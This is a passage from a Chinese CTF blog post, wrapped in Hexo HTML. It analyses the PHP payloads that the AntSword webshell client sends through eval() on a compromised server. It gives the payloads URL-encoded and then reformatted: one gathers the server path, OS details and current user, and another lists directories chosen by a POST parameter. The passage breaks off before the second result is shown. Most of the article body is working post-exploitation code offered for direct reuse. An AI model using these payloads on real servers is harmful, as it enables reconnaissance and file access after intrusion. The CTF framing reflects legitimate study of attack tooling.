@@ -1,0 +1,4649 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="LoRexxar">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="LoRexxar">
+    
+    <meta name="keywords" content="LoRexxar,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php webshell 各种函数">
+<meta property="og:url" content="https://lorexxar.cn/2016/05/12/php-shell/index.html">
+<meta property="og:site_name" content="LoRexxar&#39;s Blog">
+<meta property="og:description" content="前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用">
+<meta property="article:published_time" content="2016-05-12T12:04:02.000Z">
+<meta property="article:modified_time" content="2016-05-12T12:49:48.000Z">
+<meta property="article:author" content="LoRexxar">
+<meta property="article:tag" content="Blogs">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="LoRexxar&#39;s Blog" type="application/atom+xml">
+    
+    <title>php webshell 各种函数 · LoRexxar&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/./img/699-14040QPP9.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-127222426-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >LoRexxar&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">php webshell 各种函数</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>LoRexxar's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            php webshell 各种函数
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Blogs">Blogs</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "php">php</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2016/05/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用</p>
+<a id="more"></a>
+<p>我是通过分析蚁剑的语句来列出的，毕竟菜刀不支持php7</p>
+<h2 id="查看当前目录-amp-查看服务器信息"><a href="#查看当前目录-amp-查看服务器信息" class="headerlink" title="查看当前目录&amp;查看服务器信息"></a>查看当前目录&amp;查看服务器信息</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">40</span>ini_set(%<span class="number">22</span>display_errors%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>set_time_limit(<span class="number">0</span>)%<span class="number">3</span>B%<span class="number">40</span>set_magic_quotes_runtime(<span class="number">0</span>)%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>-%<span class="number">3</span>D%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>D%<span class="number">3</span>Ddirname(%<span class="number">24</span>_SERVER%<span class="number">5</span>B%<span class="number">22</span>SCRIPT_FILENAME%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>Bif(%<span class="number">24</span>D%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">22</span>)%<span class="number">24</span>D%<span class="number">3</span>Ddirname(%<span class="number">24</span>_SERVER%<span class="number">5</span>B%<span class="number">22</span>PATH_TRANSLATED%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">24</span>R%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>D%<span class="number">7</span>D%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>Bif(substr(%<span class="number">24</span>D%<span class="number">2</span>C0%<span class="number">2</span>C1)!%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">7</span>Bforeach(range(%<span class="number">22</span>A%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>Z%<span class="number">22</span>)as%<span class="number">20</span>%<span class="number">24</span>L)if(is_dir(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>L%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>))%<span class="number">24</span>R.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>L%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Delse%<span class="number">7</span>B%<span class="number">24</span>R.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">24</span>R.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>u%<span class="number">3</span>D(function_exists(%<span class="number">22</span>posix_getegid%<span class="number">22</span>))%<span class="number">3</span>F%<span class="number">40</span>posix_getpwuid(%<span class="number">40</span>posix_geteuid())%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>s%<span class="number">3</span>D(%<span class="number">24</span>u)%<span class="number">3</span>F%<span class="number">24</span>u%<span class="number">5</span>B%<span class="number">22</span>name%<span class="number">22</span>%<span class="number">5</span>D%<span class="number">3</span>A%<span class="number">40</span>get_current_user()%<span class="number">3</span>B%<span class="number">24</span>R.%<span class="number">3</span>Dphp_uname()%<span class="number">3</span>B%<span class="number">24</span>R.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">7</span>B%<span class="number">24</span>s%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">24</span>R%<span class="number">3</span>B%<span class="number">3</span>Becho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">3</span>D-%<span class="number">22</span>%<span class="number">3</span>Bdie()%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+<p>整理下格式</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">echo <span class="string">"-=:&#123;"</span>;</span><br><span class="line">$D=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line"><span class="keyword">if</span>($D==<span class="string">""</span>)$D=dirname($_SERVER[<span class="string">"PATH_TRANSLATED"</span>]);</span><br><span class="line">$R=<span class="string">"&#123;$D&#125;	"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">substr</span>($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">"/"</span>)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(range(<span class="string">"A"</span>,<span class="string">"Z"</span>)as $L)</span><br><span class="line">		<span class="keyword">if</span>(is_dir(<span class="string">"&#123;$L&#125;:"</span>))</span><br><span class="line">$R.=<span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$R.=<span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R.=<span class="string">"	"</span>;</span><br><span class="line">$u=(function_exists(<span class="string">"posix_getegid"</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">""</span>;</span><br><span class="line">$s=($u)?$u[<span class="string">"name"</span>]:@get_current_user();</span><br><span class="line">$R.=php_uname();</span><br><span class="line">$R.=<span class="string">"	&#123;$s&#125;"</span>;</span><br><span class="line">echo $R;;</span><br><span class="line">echo <span class="string">"&#125;:=-"</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>我们来看看返回</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">-</span>=:&#123;/home/wwwroot<span class="built_in">/default	</span>/	Linux iZ285ei82c1Z 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64	www&#125;:=-</span><br></pre></td></tr></table></figure>
+
+<h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">@ini_set</span><span class="symbol">%28</span><span class="symbol">%22</span>display_errors<span class="symbol">%22</span><span class="symbol">%2</span>C<span class="symbol">%20</span><span class="symbol">%220</span><span class="symbol">%22</span><span class="symbol">%29</span><span class="symbol">%3</span>B<span class="title">@set_time_limit</span><span class="symbol">%280</span><span class="symbol">%29</span><span class="symbol">%3</span>B<span class="title">@set_magic_quotes_runtime</span><span class="symbol">%280</span><span class="symbol">%29</span><span class="symbol">%3</span>Becho<span class="symbol">%20</span><span class="symbol">%22</span>-<span class="symbol">%3</span>D<span class="symbol">%3</span>A<span class="symbol">%7</span>B<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%24</span>D<span class="symbol">%3</span>Dbase<span class="number">64</span>_decode<span class="symbol">%28</span><span class="symbol">%24</span>_POST<span class="symbol">%5</span>B<span class="symbol">%220</span>xbad<span class="number">31815</span><span class="symbol">%22</span><span class="symbol">%5</span>D<span class="symbol">%29</span><span class="symbol">%3</span>B<span class="symbol">%24</span>F<span class="symbol">%3</span>D<span class="title">@opendir</span><span class="symbol">%28</span><span class="symbol">%24</span>D<span class="symbol">%29</span><span class="symbol">%3</span>Bif<span class="symbol">%28</span><span class="symbol">%24</span>F<span class="symbol">%3</span>D<span class="symbol">%3</span>DNULL<span class="symbol">%29</span><span class="symbol">%7</span>Becho<span class="symbol">%28</span><span class="symbol">%22</span>ERROR<span class="symbol">%3</span>A<span class="symbol">%2</span>f<span class="symbol">%2</span>f<span class="symbol">%20</span>Path<span class="symbol">%20</span>Not<span class="symbol">%20</span>Found<span class="symbol">%20</span>Or<span class="symbol">%20</span>No<span class="symbol">%20</span>Permission<span class="symbol">%21</span><span class="symbol">%22</span><span class="symbol">%29</span><span class="symbol">%3</span>B<span class="symbol">%7</span>Delse<span class="symbol">%7</span>B<span class="symbol">%24</span>M<span class="symbol">%3</span>DNULL<span class="symbol">%3</span>B<span class="symbol">%24</span>L<span class="symbol">%3</span>DNULL<span class="symbol">%3</span>Bwhile<span class="symbol">%28</span><span class="symbol">%24</span>N<span class="symbol">%3</span>D<span class="title">@readdir</span><span class="symbol">%28</span><span class="symbol">%24</span>F<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%7</span>B<span class="symbol">%24</span>P<span class="symbol">%3</span>D<span class="symbol">%24</span>D.<span class="symbol">%22</span><span class="symbol">%2</span>f<span class="symbol">%22</span>.<span class="symbol">%24</span>N<span class="symbol">%3</span>B<span class="symbol">%24</span>T<span class="symbol">%3</span>D<span class="title">@date</span><span class="symbol">%28</span><span class="symbol">%22</span>Y-m-d<span class="symbol">%20</span>H<span class="symbol">%3</span>Ai<span class="symbol">%3</span>As<span class="symbol">%22</span><span class="symbol">%2</span>C<span class="title">@filemtime</span><span class="symbol">%28</span><span class="symbol">%24</span>P<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>B@<span class="symbol">%24</span>E<span class="symbol">%3</span>Dsubstr<span class="symbol">%28</span>base_convert<span class="symbol">%28</span><span class="title">@fileperms</span><span class="symbol">%28</span><span class="symbol">%24</span>P<span class="symbol">%29</span><span class="symbol">%2</span>C<span class="number">10</span><span class="symbol">%2</span>C<span class="number">8</span><span class="symbol">%29</span><span class="symbol">%2</span>C<span class="number">-4</span><span class="symbol">%29</span><span class="symbol">%3</span>B<span class="symbol">%24</span>R<span class="symbol">%3</span>D<span class="symbol">%22</span><span class="symbol">%09</span><span class="symbol">%22</span>.<span class="symbol">%24</span>T.<span class="symbol">%22</span><span class="symbol">%09</span><span class="symbol">%22</span>.<span class="title">@filesize</span><span class="symbol">%28</span><span class="symbol">%24</span>P<span class="symbol">%29</span>.<span class="symbol">%22</span><span class="symbol">%09</span><span class="symbol">%22</span>.<span class="symbol">%24</span>E.<span class="symbol">%22</span><span class="symbol">%0</span>A<span class="symbol">%22</span><span class="symbol">%3</span>Bif<span class="symbol">%28</span><span class="title">@is_dir</span><span class="symbol">%28</span><span class="symbol">%24</span>P<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%24</span>M.<span class="symbol">%3</span>D<span class="symbol">%24</span>N.<span class="symbol">%22</span><span class="symbol">%2</span>f<span class="symbol">%22</span>.<span class="symbol">%24</span>R<span class="symbol">%3</span>Belse<span class="symbol">%20</span><span class="symbol">%24</span>L.<span class="symbol">%3</span>D<span class="symbol">%24</span>N.<span class="symbol">%24</span>R<span class="symbol">%3</span>B<span class="symbol">%7</span>Decho<span class="symbol">%20</span><span class="symbol">%24</span>M.<span class="symbol">%24</span>L<span class="symbol">%3</span>B<span class="title">@closedir</span><span class="symbol">%28</span><span class="symbol">%24</span>F<span class="symbol">%29</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%3</span>Becho<span class="symbol">%20</span><span class="symbol">%22</span><span class="symbol">%7</span>D<span class="symbol">%3</span>A<span class="symbol">%3</span>D-<span class="symbol">%22</span><span class="symbol">%3</span>Bdie<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%3</span>B</span><br></pre></td></tr></table></figure>
+<p>修改下格式</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">@ini_set</span>(<span class="string">"display_errors"</span>, <span class="string">"0"</span>)<span class="comment">;</span></span><br><span class="line"><span class="symbol">@set_time_limit</span>(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line"><span class="symbol">@set_magic_quotes_runtime</span>(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">echo <span class="string">"-=:&#123;"</span><span class="comment">;</span></span><br><span class="line">$D=base64_decode($_POST[<span class="string">"0xbad31815"</span>])<span class="comment">;</span></span><br><span class="line">$F=<span class="symbol">@opendir</span>($D)<span class="comment">;</span></span><br><span class="line"><span class="keyword">if</span>($F==<span class="literal">NULL</span>)&#123;</span><br><span class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$M=<span class="literal">NULL</span><span class="comment">;</span></span><br><span class="line">	$L=<span class="literal">NULL</span><span class="comment">;</span></span><br><span class="line">	<span class="keyword">while</span>($N=<span class="symbol">@readdir</span>($F))&#123;</span><br><span class="line">		$P=$D.<span class="string">"/"</span>.$N<span class="comment">;</span></span><br><span class="line">		$T=<span class="symbol">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="symbol">@filemtime</span>($P))<span class="comment">;</span></span><br><span class="line">		@$E=substr(base_convert(<span class="symbol">@fileperms</span>($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>)<span class="comment">;</span></span><br><span class="line">		$R=<span class="string">"	"</span>.$T.<span class="string">"	"</span>.<span class="symbol">@filesize</span>($P).<span class="string">"	"</span>.$E.<span class="string">"</span></span><br><span class="line"><span class="string">		"</span><span class="comment">;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="symbol">@is_dir</span>($P))</span><br><span class="line">		$M.=$N.<span class="string">"/"</span>.$R<span class="comment">;</span></span><br><span class="line">	<span class="keyword">else</span> $L.=$N.$R<span class="comment">;</span></span><br><span class="line">	&#125;</span><br><span class="line">	echo $M.$L<span class="comment">;</span></span><br><span class="line">	<span class="symbol">@closedir</span>($F)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">echo <span class="string">"&#125;:=-"</span><span class="comment">;</span></span><br><span class="line">die()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>看看返回什么</p>
